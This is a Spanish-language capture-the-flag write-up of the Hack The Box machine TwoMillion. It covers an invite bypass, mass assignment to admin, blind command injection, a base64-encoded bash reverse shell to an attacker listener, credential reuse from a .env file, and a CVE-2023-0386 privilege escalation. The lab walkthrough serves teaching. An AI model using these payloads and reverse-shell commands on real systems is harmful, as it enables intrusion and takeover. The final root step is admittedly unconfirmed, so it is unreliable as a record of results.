---
title: "HTB TwoMillion - Write-Up"
date: 2026-11-08
categories: [Hack The Box]
tags: [invite-bypass, mass-assignment, command-injection, overlayfs-privesc]
---

## Introducción

TwoMillion es una máquina Linux de dificultad fácil/media en Hack The Box basada en una versión antigua de la web de celebración de los 2 millones de usuarios de HTB. Combina un bypass de la página de invitación mediante ingeniería inversa de JavaScript ofuscado, una vulnerabilidad de Mass Assignment en la API para escalar a administrador, una inyección de comandos ciega en un endpoint administrativo de generación de VPN, y una escalada de privilegios final mediante CVE-2023-0386 (OverlayFS/FUSE).

**Ruta general:** Fuzzing de directorios y vhosts → página `/invite` protegida por un código de invitación → deofuscación de `inviteapi.min.js` revela el endpoint oculto `/api/v1/invite/how/to/generate` → pista codificada en ROT13 que indica usar `/api/v1/invite/generate` → código de invitación en base64 → registro de usuario → exploración de la API (`GET /api/v1` autodocumentado) que filtra rutas solo-admin → **Mass Assignment** en `PUT /api/v1/admin/settings/update` inyectando `is_admin: 1` sin ser administrador → **Command Injection** ciega en `POST /api/v1/admin/vpn/generate` a través del campo `username`, confirmada por timing (`sleep 5`) y explotada con una reverse shell codificada en base64 vía Burp Repeater → shell como `www-data` → credenciales en un fichero `.env` del webroot → movimiento lateral por SSH como `admin` (contraseña reutilizada) → escalada a root con el PoC de **CVE-2023-0386** (OverlayFS/FUSE).

## Fase 1 — Reconocimiento y fuzzing

Escaneo inicial de puertos y fuzzing de directorios/vhosts sobre `2million.htb`:

```bash
gobuster dir -u http://2million.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
```

> **Punto clave:** conviene distinguir fuzzing de directorios (`dir`) de fuzzing de vhosts (`vhost`), y filtrar falsos positivos de respuestas `200` constantes con `--exclude-length`, `-fs` o `-fw` cuando la aplicación devuelve una página "catch-all" para rutas inexistentes en lugar de un 404 real.

La ruta `/invite` aparece protegida por un formulario que exige un **código de invitación** para poder registrarse.

## Fase 2 — Deofuscación de `inviteapi.min.js`

La página `/invite` carga un script `inviteapi.min.js` ofuscado con el **Dean Edwards Packer**. Se extrae y deofusca (por ejemplo pegándolo en una consola de JS o usando un deobfuscator online) para revelar su lógica real.

El código deofuscado expone un endpoint oculto no enlazado desde ningún sitio visible:

```
GET /api/v1/invite/how/to/generate
```

```json
{
  "0": "In order to generate the invite code, you need to make a POST request to /api/v1/invite/generate",
  "1": "Ohjrira, lbh jvyy trg n JSON erfcbafr pbagnvavat n pbqr nf jryy nf n sbezng.",
  "2": "Lbh jvyy arrq gb qrpbqr gur pbqr hfvat gur sbezng gb trg lbhe artvsvpb vagvagr pbqr.",
  "3": "Gur sbezng vf nf sbyyybjf: ROT13 -> Base64"
}
```

> **Por qué funciona:** la minificación/ofuscación de un script del lado del cliente nunca es un control de seguridad real — el código se ejecuta en el navegador del atacante, que puede deofuscarlo y leer la lógica de negocio completa, incluyendo rutas de API que el desarrollador asumía "ocultas" por no estar enlazadas desde la interfaz.

Las líneas 1-3 están en **ROT13**. Al decodificarlas se obtiene la pista real:

```
Ohjrira, lbh jvyy trg n JSON erfcbafr... -> Rot13 ->
"However, you will get a JSON response containing a code as well as a format.
You will need to decode the code using the format to get your legible invite code.
The format is as follows: ROT13 -> Base64"
```

> **Nota:** la cadena ya indica el orden exacto de decodificación necesario (primero ROT13, después Base64) para transformar el código devuelto por la API en un código de invitación legible.

## Fase 3 — Generación del código de invitación

Siguiendo la pista, se hace la petición indicada:

```bash
curl -s -X POST http://2million.htb/api/v1/invite/generate
```

```json
{
  "0": "W01udmFyaWFudCBpbnZpdGUgY29kZV0=",
  "success": 1
}
```

Se decodifica primero como ROT13 y después como Base64 (o en el orden que confirme la propia API, según el formato indicado):

```bash
echo "<código_devuelto>" | rot13 | base64 -d
```

Se obtiene el código de invitación en claro, que se introduce en el formulario de `/invite` para desbloquear el registro de un nuevo usuario.

## Fase 4 — Registro y enumeración de la API

Con el código válido se completa el registro de un usuario normal. La aplicación expone una API autodocumentada en su raíz:

```bash
curl -s http://2million.htb/api/v1 | jq
```

La respuesta lista todas las rutas disponibles, incluyendo varias bajo `/api/v1/admin/...` (gestión de ajustes, generación de VPN, etc.) que en teoría requieren rol de administrador.

> **Punto clave:** un endpoint que se "autodocumenta" devolviendo el mapa completo de rutas de la API es una fuente de información extremadamente valiosa para un atacante — revela superficie de ataque (incluidas rutas admin-only) que de otro modo habría que fuzzear a ciegas.

## Fase 5 — Mass Assignment: escalada a administrador

Se inspecciona el perfil del usuario autenticado:

```bash
curl -s http://2million.htb/api/v1/user -H "Cookie: PHPSESSID=<sesion>"
```

```json
{
  "id": 2,
  "username": "darkstinx",
  "is_admin": 0
}
```

El campo `is_admin` viaja en el propio JSON del usuario. Se prueba a actualizarlo directamente a través del endpoint de administración de ajustes, pese a no tener privilegios de admin:

```bash
curl -s -X PUT http://2million.htb/api/v1/admin/settings/update \
  -H "Cookie: PHPSESSID=<sesion>" \
  -H "Content-Type: application/json" \
  -d '{"email":"darkstinx@2million.htb","is_admin":1}'
```

```json
{"success":1,"message":"Account details have been successfully updated!"}
```

> **Por qué funciona:** el backend hace *bind* de los campos del cuerpo JSON directamente sobre el modelo de usuario sin una lista blanca de campos permitidos (**Mass Assignment**). El endpoint fue pensado para que un usuario actualice su propio email, pero al no filtrar qué atributos pueden escribirse, acepta también `is_admin`, que el usuario normal no debería poder tocar. Repitiendo la consulta a `/api/v1/user` se confirma `"is_admin": 1`.

## Fase 6 — Command Injection ciega en generación de VPN

Con privilegios de administrador queda accesible el endpoint:

```
POST /api/v1/admin/vpn/generate
```

que recibe un campo `username` en el cuerpo JSON. Es imprescindible la cabecera correcta:

```bash
curl -s -X POST http://2million.htb/api/v1/admin/vpn/generate \
  -H "Cookie: PHPSESSID=<sesion>" \
  -H "Content-Type: application/json" \
  -d '{"username":"test"}'
```

Enviar el cuerpo como `application/x-www-form-urlencoded` es rechazado explícitamente por el backend (`"Invalid content type"`), señal de que el endpoint procesa el JSON crudo antes de pasarlo a una llamada de sistema.

Se confirma la inyección de comandos a ciegas mediante *time-based blind command injection*, insertando un `sleep` encadenado en el valor de `username`:

```bash
curl -s -X POST http://2million.htb/api/v1/admin/vpn/generate \
  -H "Cookie: PHPSESSID=<sesion>" \
  -H "Content-Type: application/json" \
  -d '{"username":"test;sleep 5;"}'
```

La respuesta tarda ~5 segundos de más, confirmando ejecución de comandos en el servidor.

> **Punto clave:** el campo `username` se concatena sin sanitizar en un comando de shell del lado del servidor (probablemente al generar la configuración/certificado de la VPN). El `Content-Type` correcto (`application/json`) es obligatorio porque el parser del backend solo procesa el cuerpo si llega en ese formato; con form-urlencoded la petición ni siquiera llega a la lógica vulnerable.

### Exfiltración / obtención de shell

Los intentos directos de exfiltración fallan:

- Escribir un fichero en `/var/www/html/pwned.txt` → 404 (la ruta no corresponde al webroot real).
- Pipear la salida a `nc` → sin conexión entrante.
- Exfiltración vía POST a un listener propio → `Content-Length: 0` (el comando no se ejecuta como se esperaba en ese contexto, o la salida no se transmite).

El método que finalmente funciona es inyectar una reverse shell de bash codificada en base64 y decodificarla en el propio comando inyectado, enviado vía Burp Suite Repeater:

```json
{"username": "test;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS44Mi80NDQ0IDA+JjE= | base64 -d | bash"}
```

```bash
# Listener
nc -lvnp 4444
```

> **Por qué funciona:** al codificar el payload completo en base64 se evita que cualquier carácter especial (`&`, `>`, espacios) sea destruido o mal interpretado por el parser JSON/shell intermedio; el comando inyectado simplemente decodifica y ejecuta el script de bash ya construido, sin depender de que `nc` soporte `-e` ni de que haya salida de red directa visible.

Tras recibir la conexión en el listener se obtiene una shell como `www-data`.

### Flag de usuario

```bash
cat /var/www/html/user.txt
```

## Fase 7 — Credenciales en `.env` y movimiento lateral

Enumerando el webroot real como `www-data`, se localiza un fichero `.env` con credenciales de base de datos:

```bash
cat /var/www/html/.env
```

```
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```

> **Punto clave:** es habitual que las credenciales de un fichero `.env` de una aplicación web se reutilicen también a nivel de sistema operativo. Se prueba la misma contraseña contra el usuario del sistema con el mismo nombre.

```bash
ssh admin@2million.htb
# Password: SuperDuperPass123
```

El acceso SSH como `admin` se confirma correctamente, reutilizando la contraseña filtrada en el `.env`.

## Fase 8 — Escalada de privilegios: CVE-2023-0386 (OverlayFS/FUSE)

El kernel de la máquina cae en el rango vulnerable a **CVE-2023-0386** (kernel 5.11 – <5.15.91), una vulnerabilidad en el manejo de permisos de OverlayFS al combinarse con FUSE que permite a un usuario sin privilegios escalar a root.

Se descarga y compila el PoC público [xkaneiki/CVE-2023-0386](https://github.com/xkaneiki/CVE-2023-0386):

```bash
git clone https://github.com/xkaneiki/CVE-2023-0386
cd CVE-2023-0386
make all
```

```
gcc -o fuse fuse.c -lfuse3 -lpthread
gcc -o exp exp.c
gcc -o gc getshell.c
```

> **Por qué funciona:** OverlayFS permite montar una capa superpuesta (*upper*) sobre una inferior (*lower*) usando como mediador un sistema de ficheros FUSE en espacio de usuario. El fallo permite que, al combinar un *mount* de OverlayFS no privilegiado con un FUSE controlado por el atacante, se copie un fichero propiedad de root (o con capacidades elevadas) conservando permisos SUID/propiedad que no debería poder adquirir un usuario normal — en este caso, se usa para dejar un binario SUID root.

Secuencia de explotación:

```bash
./fuse ./ovlcap/lower ./gc &
./exp
```

El exploit debe convertir `gc` en un binario SUID propiedad de root. Se comprueba y se ejecuta:

```bash
ls -la ./gc
# -rwsr-xr-x 1 root root ... ./gc
./gc
id
```

### Flag de root

```bash
cat /root/root.txt
```

> **Nota:** la conversación que documenta esta máquina termina justo tras compilar el exploit e indicar la secuencia `./fuse ... & / ./exp / comprobar SUID en `gc` / ./gc / cat /root/root.txt`, pero no muestra explícitamente la salida final confirmando `uid=0` ni el contenido de la flag de root. Si al ejecutar `./gc` no obtienes directamente una shell root, comprueba que el bit SUID se haya aplicado correctamente sobre `gc` (`ls -la ./gc`) y repite `./exp` si es necesario — dime si el resultado final fue distinto y ajusto esta sección.
